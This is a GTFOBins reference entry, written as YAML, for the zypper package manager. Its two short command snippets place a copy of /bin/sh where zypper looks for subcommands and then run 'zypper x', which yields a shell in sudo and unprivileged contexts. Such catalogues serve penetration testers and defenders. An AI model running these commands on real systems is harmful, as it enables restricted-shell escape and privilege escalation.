<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/zypper -->
---
functions:
  shell:
  - code: |-
      cp /bin/sh /usr/lib/zypper/commands/zypper-x
      zypper x
    comment: |-
      The copy usually requires elevated privileges.
    contexts:
      sudo:
      unprivileged:
  - code: |-
      cp /bin/sh /path/to/temp-dir/zypper-x
      PATH=$PATH:/path/to/temp-dir/ zypper x
    contexts:
      sudo:
      unprivileged:
...
